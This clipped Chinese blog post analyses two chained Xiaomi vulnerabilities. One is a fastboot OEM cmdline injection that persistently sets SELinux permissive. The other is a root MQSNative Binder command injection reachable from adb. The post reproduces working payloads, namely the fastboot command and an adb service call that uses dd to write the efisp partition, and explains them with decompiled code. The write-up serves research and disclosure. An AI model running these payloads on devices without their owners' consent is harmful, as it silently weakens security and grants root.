---
title: "Preempted: From ADB Service Call to Bootloader Unlock on Xiaomi"
source: https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html
source_host: bestwing.me
clip_date: 2026-11-04T10:25:26+08:00
trace_id: b0d131a0-a34a-4437-9df8-14c1879b4c0e
content_hash: 0c07a2c9ee5df20055478ad236840da20015c9526777c4f1ae37bd4d2d76097c
status: synced
tags:
  - Android逆向
  - 漏洞分析
series: null
feed_source: Swings·漏洞/二进制
ai_summary: TL;DR：小米 ROM 两个漏洞可串联解锁 Bootloader——Fastboot OEM cmdline 注入永久降级 SELinux，再借 MQSNative Binder 命令注入从 adb 提权到 root。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40e75244-d011-819f-a895-f74d03435a23
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：小米 ROM 两个漏洞可串联解锁 Bootloader——Fastboot OEM cmdline 注入永久降级 SELinux，再借 MQSNative Binder 命令注入从 adb 提权到 root。
> 
> - **注入根因：** ABL（LinuxLoader.efi）的 `CmdOemSetGpuPreemptionValue` 只过滤前导空格、不校验整串，`fastboot oem set-gpu-preemption-value 0 androidboot.selinux=permissive` 的多余部分被拼入 GpuPreemptionValue 并经 `SetVariable` 写入 NVRAM 变量 `GpuConfiguration`。
> - **持久化降级：** 该 UEFI 变量为 NON_VOLATILE，重启、恢复出厂均不清除；每次开机 `UpdateCmdLine()` 无校验地把它拼进 kernel cmdline，实现"一次注入 = 永久 SELinux permissive"，且设置界面仍显示 Enforcing。
> - **root 服务：** `hypsys_system` 以 root 权限注册 `miui.mqsas.IMQSNative` Binder 服务；v2 更正后确认 adb shell 可直接访问该服务，普通 App 则不能。
> - **命令注入：** transaction 21 `captureLogByRunCommand` 接受任意命令与参数，既无白名单/黑名单过滤也无权限检查，公开 payload 借 `dd` 直接写入 `/dev/block/by-name/efisp` 分区。
> - **利用链：** SELinux 宽容模式下 adb 调用该 Binder 即可执行任意 root 命令；分析基于 nezha_global_images_OS3.0.9.0 ROM，由作者与 @MG1937 共同完成。

BEGIN_PAYLOAD20260309

Preempted: From ADB Service Call to Bootloader Unlock on Xiaomi

## MQSNative 提权 + ABL Cmdline 注入 —— 小米三八解锁节漏洞分析

## TL; DR

3月9号，也就是今天似乎已经热更新完了，我没有验证。为了避免白下，于是挑了一个看起来比较老的 ROM [1](#fn:1) ，解包过程不赘述了。直接开始分析涉及到的其中两个漏洞

1.  Fastboot OEM Inject 可以注入cmdline 启动参数，将 selinux 设置为宽容模式
2.  MIUI MQSNative Binder 提权漏洞，也是一个命令注入，可以通过adb获取高权限，前提 selinux 已经设置为宽容模式

另外这俩漏洞分析由我和 @MG1937 [2](#fn:2) 共同完成

## Fastboot OEM cmdline 注入

这个漏洞是 ABL 的漏洞，二进制文件在 `nezha_global_images_OS3.0.9.0.WPAMIXM_16.0/images/abl.elf`

通过 `binwalk` 层层解压，最后用 7z 解压一个 `decompressed.bin.7z` 得到一个 `LinuxLoader.efi`

Payload:

```bash
fastboot oem set-gpu-preemption-value 0 androidboot.selinux=permissive
```

以上述这个 Payload 展开分析：

### USB -> Fastboot 协议

Fastboot 协议通过 USB bulk transfer 发送原始命令字符串：

```
USB TX: "oem set-gpu-preemption 0 androidboot.selinux=permissive"
```

LinuxLoader.efi 的 fastboot command dispatch loop 遍历 g_OemCmdTable\[30\] (0xCAC08)，对每个 entry 做前缀匹配。匹配到 index 14：

```haskell
.data:00000000000CACE8                 DCQ aOemSetGpuPreem     ; "oem set-gpu-preemption"
.data:00000000000CACF0                 DCQ CmdOemSetGpuPreemptionValue
.data:00000000000CACF8                 DCQ aOemDeviceInfo      ; "oem device-info"
.data:00000000000CAD00                 DCQ CmdOemDevinfo
```

调用时 arg 指针指向匹配前缀之后的部分：

```
完整命令: "oem set-gpu-preemption 0 androidboot.selinux=permissive"
                               .^
                                arg 指向这里
arg = " 0 androidboot.selinux=permissive"
       ↑ 注意开头有一个空格
```

### CmdOemSetGpuPreemptionValue 执行

```c
AsciiStrnCpyS(v703, "Set GPU HW Preemption: ", 64);// Resp[0x40] = "Set GPU HW Preemption: "
AsciiStrnCpyS(v702, " msm_kgsl.preempt_enable=", 256);// GpuPreemptionValue[0x100] = " msm_kgsl.preempt_enable="
while ( AsciiStrLen(v331) && *v331 == 0x20 )  // if (arg[Pos] == ' ') { arg++; Pos--; } else break;
  ++v331;
```

此刻栈上：

```c
GpuPreemptionValue: [' ','m','s','m','_','k','g','s','l','.','p','r','e','e','m',
                     'p','t','_','e','n','a','b','l','e','=','\0', ... 0x100 bytes]
```

前导空格过滤循环 (0x5F7DC–0x5F7F8)

```c
// arg = " 0 androidboot.selinux=permissive"
//        ^

  0x5F7E0  AsciiStrLen(arg)    → 33    // 非零，继续
  0x5F7E8  LDRB W8, [X19]              // W8 = *arg = 0x20 (空格)
  0x5F7EC  CMP  W8, #0x20              // 是空格？是
  0x5F7F0  B.NE done                   // 不跳转
  0x5F7F4  ADD  X19, X19, #1           // arg++ 跳过这个空格
  0x5F7F8  B    loop

  // 第二次迭代:
  // arg = "0 androidboot.selinux=permissive"
  //        ^
  0x5F7E8  LDRB W8, [X19]              // W8 = *arg = 0x30 ('0')
  0x5F7EC  CMP  W8, #0x20              // 是空格？不是
  0x5F7F0  B.NE done                   // ← 跳出循环
```

过滤后： `arg = "0 androidboot.selinux=permissive"`  
循环在遇到第一个非空格字符 ‘0’ 后立即退出。字符串中间的空格 “0 androidboot…” 完全未被检查。

```c
v336 = AsciiStrLen(v331);                     // AsciiStrLen(arg) - get length of user input (with embedded spaces)
// VULNERABILITY: AsciiStrnCatS(GpuPreemptionValue, 0x100, arg, len) -
```

拼接完后的 GpuPreemptionValue 为

```
GpuPreemptionValue = " msm_kgsl.preempt_enable=0 androidboot.selinux=permissive\0"
                        ←──────────────────── 58 字节 ───────────────────────→
```

最后应该是写入 UEFI NVRAM里了

```c
@0x5F818  X20 = gRT_ptr->SetVariable        // offset 0x58 in EFI_RUNTIME_SERVICES
                                               // 即 SetVariable 函数指针

@0x5F828  AsciiStrLen(GpuPreemptionValue)    → 58

@0x5F838  gRT->SetVariable(
             L"GpuConfiguration",              // VariableName (Unicode)
             &gOemConfigVariableGuid,          // VendorGuid @ 0xCB3B4
             EFI_VARIABLE_NON_VOLATILE |       // Attributes = 7
               EFI_VARIABLE_BOOTSERVICE_ACCESS |
               EFI_VARIABLE_RUNTIME_ACCESS,
// DataSize
             " msm_kgsl.preempt_enable=0 androidboot.selinux=permissive"
           )
```

payload 已持久化到 UEFI NVRAM。 NON_VOLATILE 意味着：

-   重启不丢失
-   恢复出厂设置不清除（factory reset 只擦 userdata/cache 分区，不动 UEFI 变量）
-   刷机不一定清除（除非刷入的固件主动删除该变量）

### Kernel 解析 cmdline

设备重启后，ABL 加载 kernel 之前调用 `UpdateCmdLine()` 构造完整的 kernel command lin

先试读取 `GpuConfiguration` 变量

```c
xEF20  X8 = *gRT_ptr                       // 取 EFI_RUNTIME_SERVICES*
  0xEF2C  X0 = L"G"                           // 短字符串优化，实际是 L"GpuConfiguration"
  0xEF34  X1 = &gOemConfigVariableGuid
  0xEF3C  X2 = 0                              // Attributes = NULL
  0xEF40  X8 = gRT->GetVariable               // offset 0x48
  0xEF44  BLR X8                              // 调用 GetVariable

           返回: EFI_SUCCESS (0)
           输出 buffer 内容:
           " msm_kgsl.preempt_enable=0 androidboot.selinux=permissive"
```

计算长度并追加到 cmdline (0xEF68–0xEF94)

```c
0xEF68  X0 = &GpuCmdLine buffer             // 指向 GetVariable 输出
0xEF70  AsciiStrLen(GpuCmdLine)     → 58
0xEF78  AsciiStrnLenS_0x100(58)             // 边界检查 ≤ 0x100，通过

0xEF94  AppendToCmdLine(
             cmdline_dst,                      // 最终 kernel cmdline buffer
             GpuCmdLine,                       // " msm_kgsl.preempt_enable=0 androidboot.selinux=permissive"
// 长度
           )
```

无任何校验，直接拼接到 kernel command line。

这样当系统启动后，init 进程读取该 prop，将 SELinux 设为 permissive 模式

SELinux permissive 意味着：

-   所有 SELinux MAC 策略不再强制执行，只审计记录
-   任何进程可以访问任何文件、socket、设备节点
-   ADB shell 可以直接 su 而不被 SELinux 阻止
-   配合其他提权漏洞（如 MQSNative service call）可直接获得无约束 root

一个简单的流程

```
┌──────────────┐     写入      ┌─────────────────────┐
│  fastboot     │─────────────→│  UEFI NVRAM          │
│  oem 命令     │              │  GpuConfiguration    │
└──────────────┘              │  NON_VOLATILE        │
                               └──────────┬──────────┘
                                          │ 每次启动读取
                               ┌──────────▼──────────┐
                               │  UpdateCmdLine()     │
                               │  → kernel cmdline    │
                               │  → SELinux permissive│
                               └─────────────────────┘
                                          │
                              每次开机自动生效，直到:
                              1. fastboot oem set-gpu-preemption 0  (覆盖为正常值)
                              2. UEFI 变量被手动清除
                              3. 重刷完整固件（不一定清除 NVRAM）
```

一次注入 = 永久 SELinux 降级。用户无感知，设置界面仍显示 “Enforcing”（因为 UI 读的是运行时状态，而该注入在 init 早期就已生效）。

## MIUI MQSNative Binder Privilege Escalation

这个漏洞涉及到的 Binder 服务是 MIUI MQSNative。 解包后通过朴实无华的 `grep` 命令可以找到两个二进制程序

-   `./system_ext_extracted/bin/hypsys_system`
-   `./system_ext_extracted/lib64/miui.mqsas.native-cpp.so`

另外 grep 到一个 `selinux` 的配置

```
./system_ext_extracted/etc/selinux/system_ext_service_contexts:14:miui.mqsas.IMQSNative u:object_r:mqsasd_service:s0
```

进一步查找可以知道访问该服务的核心域 (Domains)有如下，

1.  updater:
    -   对应的 App: 通常是小米官方的“系统更新” (Updater) 应用。
    -   权限: 这个 App 运行在 updater 域中，显然它需要调用 mqsasd 来执行某些系统维护任务（比如写入 Persist 文件或运行特定命令）。
2.  system_server:
    -   对应的组件: Android 系统的核心进程（system_server）。
    -   含义: 系统服务（如 ActivityManagerService 或小米自定义的 Framework 服务）可以自由访问此接口。
3.  hypsys_ssi_client:
    -   对应的组件: 这是一个通用的客户标签。我们需要找出哪些进程被标记为 hypsys_ssi_client。
    -   推测: 通常是一些负责系统稳定性监控、性能优化的系统级组件。

~~因此正常的 adb shell 应该也是访问不到这个Binder的~~ ，

adb shell 是能访问到这个BInder的， 但是普通App权限应该不能（所以大概率不会被某XX利用） 接着分析 `MQSNative Binde`

在 `./system_ext_extracted/etc/init/hypsys_system.rc` init 的配置文件中可以看到, MQSNative Binder 服务以 root 权限 运行

```bash
$ cat ./system_ext_extracted/etc/init/hypsys_system.rc |grep hypsys_system -A 10
service hypsys_system /system_ext/bin/hypsys_system
    user root
    group system root cache log everybody product_hyperengine
    disabled
    socket mqsasd stream 0660 system system
    socket mqsasd_pr dgram 0666 system system
```

### MQSNative Binder 注册

`MQSNative Binder` 的注册在 `/system_ext/bin/hypsys_system` main 函数里能看到

```c
...
// 0x9b680-0x9b724
 v41 = (MQSNativeDaemon *)operator new(0x30uLL);
  MQSNativeDaemon::MQSNativeDaemon(v41);
  android::defaultServiceManager(&serviceManager);
  // vtable+48 = IServiceManager::addService
  result = serviceManager->vptr->addService(
      serviceManager,
      descriptor,    // "miui.mqsas.IMQSNative" (String16)
      v41,           // MQSNativeDaemon* (作为 IBinder)
// allowIsolated = false
// dumpPriority = PRIORITY_DEFAULT
  );
```

main 函数主要按以下顺序完整注册任务

```sql
+-------------------------------------------------------+
|                main() in hypsys_system                |
+-------------------------------------------------------+
                            |
                            v
+-------------------------------------------------------+
| [Step 1] HypSysSsi (AIDL NDK API)                     |
|  - Create HypSysSsiImpl                               |
|  - AServiceManager_addService("...IHypSysSsi/default")|
+-------------------------------------------------------+
                            |
                            v
+-------------------------------------------------------+
| [Step 2] BnHypSysSsiIntl (AIDL NDK API)               |
|  - Create BnHypSysSsiIntl                             |
|  - AServiceManager_addService("...IHypSysSsiIntl/...")|
+-------------------------------------------------------+
                            |
                            v
+-------------------------------------------------------+
| [Step 3] MQSNativeDaemon (Legacy Binder API)          | <--- 我们所关注的服务
|  - operator new(0x30)                                 |
|  - MQSNativeDaemon::MQSNativeDaemon()                 |
|  - android::defaultServiceManager()                   |
|  - IServiceManager::addService("miui.mqsas.IMQSNative")|
+-------------------------------------------------------+
                            |
                            v
+-------------------------------------------------------+
| [Step 4] ABinderProcess_startThreadPool()             |
|  - 启动子线程处理 Binder 请求                         |
+-------------------------------------------------------+
                            |
                            v
+-------------------------------------------------------+
| [Step 5] ABinderProcess_joinThreadPool()              |
|  - 主线程加入线程池，开始循环监听请求                 |
+-------------------------------------------------------+
```

### onTransact 分派

`BnMQSNative::onTransact` 位于 `./system_ext_extracted/lib64/miui.mqsas.native-cpp.so` 依赖库里的 0xC0B4

其是一个包含22 个case 的switch 大函数体， 映射了 22 个AIDL 的接口方法， 其中公开payload 中用到的是 21 这个

公开的payload是

```bash
adb shell service call miui.mqsas.IMQSNative 21 \
    i32 1 s16 "dd"                                          \
    i32 1 s16 "if=/data/local/tmp/gbl of=/dev/block/by-name/efisp" \
    s16 "/data/mqsas/log.txt"                               \
    i32 60
```

其对应的伪代码为如下

```c
case 0x15u:  // captureLogByRunCommand - CRITICAL VULNERABILITY
    readStatus = data->readString16Vector(&cmds_vec);
    if (readStatus == 0) {
        readStatus = data->readString16Vector(&args_vec);
        if (readStatus == 0) {
            readStatus = data->readString16(&logFilePath);
            if (readStatus == 0) {
                readStatus = data->readInt32(&timeout);
                if (readStatus == 0) {
                    // 无任何权限检查，直接调用虚函数
                    this->vptr->captureLogByRunCommand(
                        this, cmds_vec, args_vec, logFilePath, timeout,
                        &call_status, &call_status_msg
                    );
                }
            }
        }
    }
```

其调用的功能是 `captureLogByRunCommand`

我们简单映射一下ADB命令和 Parcel 参数的映射结果如下

| Parcel 数据 | 反序列化调用 | 含义  |
| :--- | :--- | :--- |
| `i32 1` + `s16 "dd"` | `readString16Vector(&cmds)` | **命令向量**：size=1, \[“dd”\] |
| `i32 1` + `s16 "if=... of=..."` | `readString16Vector(&args)` | **参数向量**：size=1, \[“if=/data/local/tmp/gbl of=/dev/block/by-name/efisp”\] |
| `s16 "/data/mqsas/log.txt"` | `readString16(&logFile)` | **日志文件路径** |
| `i32 60` | `readInt32(&timeout)` | **超时秒数** |

`captureLogByRunCommand` -> `miui::mqsas::BpMQSNative::captureLogByRunCommand` 最后结果就是：

```
任意命令+参数：captureLogByRunCommand 接受任意命令名和参数，无白名单/黑名单过滤
```

## changelog

v2: 修复了一些 selinux 的错别字  
v1: 更改了错误说法，其实 ·adb shell· 是可以访问到小米 MQSNative Binder 的

## Reference link

EOFCHECKSUM_OK

1.  1.https://bn.d.miui.com/OS3.0.9.0.WPAMIXM/nezha_global_images_OS3.0.9.0.WPAMIXM_20260210.0000.00_16.0_global_e160067725.tgz [↩](#fnref:1 "return to article")
    
2.  2.https://github.com/MG1937 [↩](#fnref:2 "return to article")
